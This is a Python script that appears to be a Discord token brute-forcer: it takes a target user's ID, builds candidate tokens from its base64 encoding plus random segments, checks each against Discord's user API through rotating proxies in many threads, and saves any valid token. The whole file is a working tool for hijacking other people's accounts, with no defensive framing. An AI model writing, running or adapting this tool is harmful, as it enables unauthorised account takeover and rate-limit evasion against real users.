import random
import string
from urllib.request import Request, urlopen, ProxyHandler, build_opener, install_opener
import threading
import os
import base64

banner  = """
          XX                                    XX
        XX..X                                  X..XX
      XX.....X                                X.....XX
 XXXXX.....XX                                  XX.....XXXXX
X |......XX%,.@                              @#%,XX......| X
X |.....X  @#%,.@                          @#%,.@  X.....| X
X  \...X     @#%,.@                      @#%,.@     X.../  X
 X# \.X        @#%,.@                  @#%,.@        X./  #
  ##  X          @#%,.@              @#%,.@          X   #
, "# #X            @#%,.@          @#%,.@            X ##
   `###X             @#%,.@      @#%,.@             ####'
  . ' ###              @#%.,@  @#%,.@              ###`"
    . ";"                @#%.@#%,.@                ;"` ' .
      '                    @#%,.@                   ,.
      ` ,                @#%,.@  @@                `
                          @@@  @@@                  ."""




class colors:
    white = '\033[38;2;255;255;255m'
    green = '\033[38;2;0;240;50m'
    purple = '\033[38;2;255;0;255m'


checked  = 0
valid = 0


def print_banner(banner: str) -> str:
    lines = banner.splitlines()
    lines.remove('')
    b = 255
    color_sub = 15

    for line in lines:
        b -= color_sub
        print(f'\033[38;2;255;0;{b}m' + line + colors.white)
    print('\n')


def clear() -> None:
    os.system('cls' if os.name == 'nt' else 'clear')

def title(content: str) -> None:
    os.system(f'title {content}' if os.name == 'nt' else '')

def proxy_list(proxy_list: str) -> str or bool:
    if proxy_list == '':
        return False
    
    with open(proxy_list, "r+") as file:
        proxies = file.read().split('\n')

        for prox in proxies:
            if len(prox) < 9:
                proxies.remove(prox)

        return random.choice(proxies)


def check_token(token: str) -> bool:
    proxy = proxy_list(list_proxy)

    if proxy:
        proxy_support = ProxyHandler({'http' : 'http://%s' %proxy, 'https': 'https://%s' %proxy})
        install_opener(build_opener(proxy_support))

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v15530512593 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def half_token(id: str) -> str:
    return base64.b64encode(id.encode()).decode().replace('=', '')

def brute_force(id: str, threads: list) -> None:
    global checked, valid
    lock = threading.Lock()
    while True:
        token = (half_token(id) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=6)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=38)))

        with open('all_tokens.txt', 'r+') as file:
            all_tokens = file.read().split('\n')
        
        if token not in all_tokens:
            with open('all_tokens.txt', 'a+') as file:
                file.write(token + '\n')

            lock.acquire()
            checked +=1
            title(f'Token~BruteFroce [ Checked: {checked} Valide: {valid} ]')
            lock.release()

            if check_token(token):
                lock.acquire()
                valid += 1
                title(f'Token~BruteFroce [ Checked: {checked} Valide: {valid} ]')
                lock.release()

                with open('valid_tokens.txt', 'a+') as file:
                    file.write(token + '\n')
                print(f'{colors.green}[!] Valid Token{colors.white}')
                
                break
    
    try:
        for thread in threads:
            thread.join()
    except RuntimeError as e:
        pass

if __name__ == "__main__":
    clear()
    print_banner(banner)
    id = input(f'{colors.purple}[?] Id To Brute Force > {colors.white}')
    num_thread = int(input(f'{colors.purple}[?] Number of Thread > {colors.white}'))
    list_proxy = input(f'{colors.purple}[?] Drag your proxies file > {colors.white}')
    print('\n')

    list_thread = []
    for _ in range(num_thread):
        list_thread.append(threading.Thread(target=brute_force, args= (id, list_thread,), ))

    for thread in list_thread:
        thread.start()
